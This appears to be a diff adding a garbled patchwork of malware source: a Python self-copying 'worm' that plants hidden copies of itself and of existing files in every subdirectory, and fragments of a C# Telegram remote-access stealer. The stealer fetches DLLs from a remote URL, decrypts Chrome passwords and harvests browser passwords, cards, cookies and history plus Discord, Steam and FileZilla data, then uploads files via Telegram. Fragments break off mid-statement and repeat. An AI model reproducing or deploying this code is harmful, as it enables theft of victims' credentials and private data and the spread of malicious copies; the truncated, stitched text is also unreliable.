@@ -1,0 +1,378 @@
+class Worm:
+    
+    def __init__(self, path=None, target_dir_list=None, iteration=None):
+        if isinstance(path, type(None)):
+            self.path = "/"
+        else:
+            self.path = path
+            
+        if isinstance(target_dir_list, type(None)):
+            self.target_dir_list = []
+        else:
+            self.target_dir_list = target_dir_list
+            
+        if isinstance(target_dir_list, type(None)):
+            self.iteration = 2
+        else:
+            self.iteration = iteration
+        
+        # get own absolute path
+        self.own_path = os.path.realpath(__file__)
+
+    def list_directories(self,path):
+        self.target_dir_list.append(path)
+        files_in_current_directory = os.listdir(path)
+        
+        for file in files_in_current_directory:
+            # avoid hidden files/directories (start with dot (.))
+            if not file.startswith('.'):
+                # get the full path
+                absolute_path = os.path.join(path, file)
+                print(absolute_path)
+
+                if os.path.isdir(absolute_path):
+                    self.list_directories(absolute_path)
+                else:
+                    pass
+
+def create_new_worm(self):
+        for directory in self.target_dir_list:
+            destination = os.path.join(directory, ".worm.py")
+            # copy the script in the new directory with similar name
+            shutil.copyfile(self.own_path, destination)
+
+def copy_existing_files(self):
+        for directory in self.target_dir_list:
+            file_list_in_dir = os.listdir(directory)
+            for file in file_list_in_dir:
+                abs_path = os.path.join(directory, file)
+                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
+                    source = abs_path
+                    for i in range(self.iteration):
+                        destination = os.path.join(directory,("."+file+str(i)))
+                        shutil.copyfile(source, destination)    
+def start_worm_actions(self):
+        self.list_directories(self.path)
+        print(self.target_dir_list)
+        self.create_new_worm()
+        self.copy_existing_files()
+
+if __name__=="__main__":
+    current_directory = os.path.abspath("")
+    worm = Worm(path=current_directory)
+    worm.start_worm_actions()
+using System.IO;		
+		using System.Threading;
+		using System.Collections.Generic;
+		
+		namespace TelegramRAT
+		{
+		internal class AutoStealer
+		{
+		// Thread
+		public static Thread AutoStealerThread = new Thread(steal);
+		private static string lockfile = Path.GetDirectoryName(config.InstallPath) + "\\autosteal.lock";
+		
+		// Check dll's before decryption chromium passwords
+		public static void loadDlls()
+		{
+		core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
+		core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll");
+		core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll");
+		}
+		
+		// Steal
+		private static void steal()
+		{
+		// If disabled in config
+		if(!config.AutoStealerEnabled)
+		return;
+		
+		// Only on first start
+		if (File.Exists(lockfile))
+		return;
+		
+		// Create lockfile if not exists
+		File.Create(lockfile);
+		// Threads list
+		List<Thread> threads = new List<Thread> {
+		// Screenshot
+		new Thread(utils.desktopScreenshot),
+		// Steal all data from browsers
+		new Thread(Passwords.get),
+		new Thread(CreditCards.get),
+		new Thread(History.get),
+		new Thread(Bookmarks.get),
+		new Thread(Cookies.get),
+		// Steal other data from apps
+		new Thread(FileZilla.get),
+		new Thread(TelegramGrabber.get),
+		new Thread(DiscordGrabber.get),
+		new Thread(SteamGrabber.get),
+		// Steal desktop documents
+		new Thread(GrabDesktop.get)
+		};
+		
+		// Info
+		telegram.sendText("🌹 Starting autostealer...");
+		// Start stealer threads
+		foreach(Thread thread in threads)
+		{
+		thread.Start();
+		}
+		// Wait 20 seconds
+		Thread.Sleep(20 * 1000);
+		// Info
+		telegram.sendText("🥀 Stopping autostealer...");
+		// Stop stealer threads
+		foreach (Thread thread in threads)
+		{
+		if(thread.IsAlive)
+		{
+		try
+		{
+		thread.Abort();
+		}
+		catch { }
+		}
+		}
+		
+		
+		
+		
+		}
+		
+		}
+		
+public static void get()		
+		{
+		// loadDlls
+		AutoStealer.loadDlls();
+		// Path info
+		string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+		string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
+		string u_s = "\\User Data\\Default\\Cookies";
+		// Browsers list
+		string[] chromiumBasedBrowsers = new string[]
+		{
+		l_a + "Google\\Chrome" + u_s,
+		l_a + "Google(x86)\\Chrome" + u_s,
+		l_a + "Chromium" + u_s,
+		a_a + "Opera Software\\Opera Stable\\Cookies",
+		l_a + "BraveSoftware\\Brave-Browser" + u_s,
+		l_a + "Epic Privacy Browser" + u_s,
+		l_a + "Amigo" + u_s,
+		l_a + "Vivaldi" + u_s,
+		l_a + "Orbitum" + u_s,
+		l_a + "Mail.Ru\\Atom" + u_s,
+		l_a + "Kometa" + u_s,
+		l_a + "Comodo\\Dragon" + u_s,
+		l_a + "Torch" + u_s,
+		l_a + "Comodo" + u_s,
+		l_a + "Slimjet" + u_s,
+		l_a + "360Browser\\Browser" + u_s
+public static void get()		
+		{
+		// loadDlls
+		AutoStealer.loadDlls();
+		// Path info
+		string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+		string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
+		string u_s = "\\User Data\\Default\\Web data";
+		// Browsers list
+		string[] chromiumBasedBrowsers = new string[]
+		{
+		l_a + "Google\\Chrome" + u_s,
+		l_a + "Google(x86)\\Chrome" + u_s,
+		l_a + "Chromium" + u_s,
+		a_a + "Opera Software\\Opera Stable\\Web Data",
+		l_a + "BraveSoftware\\Brave-Browser" + u_s,
+		l_a + "Epic Privacy Browser" + u_s,
+		l_a + "Amigo" + u_s,
+		l_a + "Vivaldi" + u_s,
+		l_a + "Orbitum" + u_s,
+		l_a + "Mail.Ru\\Atom" + u_s,
+		l_a + "Kometa" + u_s,
+		l_a + "Comodo\\Dragon" + u_s,
+		l_a + "Torch" + u_s,
+		l_a + "Comodo" + u_s,
+		l_a + "Slimjet" + u_s,
+		l_a + "360Browser\\Browser" + u_s
+using System;		
+		using System.IO;
+		using System.Linq;
+		using System.Text;
+		
+		namespace TelegramRAT
+		{
+		internal class Crypt
+		{
+		
+		// Decrypt value from Chrome > 80 version.
+		public static string decryptChrome(string password, string browser = "")
+		{
+		// If Chromium version > 80
+		if (password.StartsWith("v10") || password.StartsWith("v11"))
+		{
+		// Check dll's before decryption chromium passwords
+		core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
+		core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll");
+		core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll");
+		// Get masterkey location
+		string masterKey, masterKeyPath = "";
+		foreach (string l_s in new string[] { "", "\\..", "\\..\\.." })
+		{
+		masterKeyPath = Path.GetDirectoryName(browser) + l_s + "\\Local State";
+		if (File.Exists(masterKeyPath))
+		{
+		break;
+		}
+		else
+		{
+		masterKeyPath = null;
+		continue;
+		}
+		}
+		// Get master key
+		masterKey = File.ReadAllText(masterKeyPath);
+		masterKey = SimpleJSON.JSON.Parse(masterKey)["os_crypt"]["encrypted_key"];
+		// Decrypt master key
+		byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(masterKey)).Remove(0, 5));
+		byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes, null, out string _);
+		byte[] bytePassword = Encoding.Default.GetBytes(password).ToArray();
+		// Decrypt password by master-ke
+using System;		
+		using System.IO;
+		
+		namespace TelegramRAT
+		{
+		internal class History
+		{
+		
+		public static void get()
+		{
+		// loadDlls
+		AutoStealer.loadDlls();
+		// Path info
+		string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+		string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
+		string u_s = "\\User Data\\Default\\History";
+		// Browsers list
+		string[] chromiumBasedBrowsers = new string[]
+		{
+		l_a + "Google\\Chrome" + u_s,
+		l_a + "Google(x86)\\Chrome" + u_s,
+		l_a + "Chromium" + u_s,
+		a_a + "Opera Software\\Opera Stable\\History",
+		l_a + "BraveSoftware\\Brave-Browser" + u_s,
+		l_a + "Epic Privacy Browser" + u_s,
+		l_a + "Amigo" + u_s,
+		l_a + "Vivaldi" + u_s,
+		l_a + "Orbitum" + u_s,
+		l_a + "Mail.Ru\\Atom" + u_s,
+		l_a + "Kometa" + u_s,
+		l_a + "Comodo\\Dragon" + u_s,
+		l_a + "Torch" + u_s,
+		l_a + "Comodo" + u_s,
+		l_a + "Slimjet" + u_s,
+		l_a + "360Browser\\Browser" + u_s,
+		l_a + "Maxthon3" + u_s,
+		l_a + "K-Melon" + u_s,
+		l_a + "Sputnik\\Sputnik" + u_s,
+		l_a + "Nichrome" + u_s,
+		l_a + "CocCoc\\Browser" + u_s,
+		l_a + "uCozMedia\\Uran" + u_s,
+		l_a + "Chromodo" + u_s,
+		l_a + "Yandex\\YandexBrowser" + u_s
+		};
+		
+		// Database
+		string tempHistoryLocation = "";
+		string filename = "history.txt";
+		string output = "[HISTORY]\n\n";
+		
+		// Search all browsers
+		foreach (string browser in chromiumBasedBrowsers)
+		{
+		if (File.Exists(browser))
+		{
+		tempHistoryLocation = Environment.GetEnvironmentVariable("temp") + "\\browserHistory";
+		if (File.Exists(tempHistoryLocation))
+		{
+		File.Delete(tempHistoryLocation);
+		}
+		File.Copy(browser, tempHistoryLocation);
+		} else {
+		continue;
+		}
+		
+		// Read chrome database
+		cSQLite sSQLite = new cSQLite(tempHistoryLocation);
+		sSQLite.ReadTable("urls");
+		
+		for (int i = 0; i < sSQLite.GetRowCount(); i++)
+		{
+		// Get data from database
+		string url = Convert.ToString(sSQLite.GetValue(i, 1));
+		string title = Convert.ToString(sSQLite.GetValue(i, 2));
+		string visits = Convert.ToString(Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1);
+		string time = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sSQLite.GetValue(i, 5))), TimeZoneInfo.Local));
+		
+		
+		// If no data => break
+		if (string.IsNullOrEmpty(url))
+		{
+		break;
+		}
+		// Add
+		output += "URL: " + url + "\n"
+		+ "TITLE: " + Crypt.toUTF8(title) + "\n"
+		+ "VISITS: " + visits + "\n"
+		+ "DATE: " + time + "\n"
+		+ "\n";
+		continue;
+		}
+		continue;
+		}
+		// Send
+		File.WriteAllText(filename, output);
+		telegram.UploadFile(filename, true);
+		}
+		}
+		
+		
+		using System;
+		using System.IO;
+		
+		namespace TelegramRAT
+		{
+		internal class Passwords
+		{
+		
+		public static void get()
+		{
+		// loadDlls
+		AutoStealer.loadDlls();
+		// Path info
+		string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+		string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
+		string u_s = "\\User Data\\Default\\Login Data";
+		// Browsers list
+		string[] chromiumBasedBrowsers = new string[]
+		{
+		l_a + "Google\\Chrome" + u_s,
+		l_a + "Google(x86)\\Chrome" + u_s,
+		l_a + "Chromium" + u_s,
+		a_a + "Opera Software\\Opera Stable\\Login Data",
+		l_a + "BraveSoftware\\Brave-Browser" + u_s,
+		l_a + "Epic Privacy Browser" + u_s,
+		l_a + "Amigo" + u_s,
+		l_a + "Vivaldi" + u_s,
+		l_a + "Orbitum" + u_s,
+		l_a + "Mail.Ru\\Atom" + u_s,
+		l_a + "Kometa" + u_s,
+		l_a + "Comodo\\Dragon" + u_s,
+		l_a + "Torch" + u_s,
+		l_a + "Comodo" + u_s,
+		l_a + "Slimjet" + u_s,
+		l_a + "360Browser\\Browser" + u_s
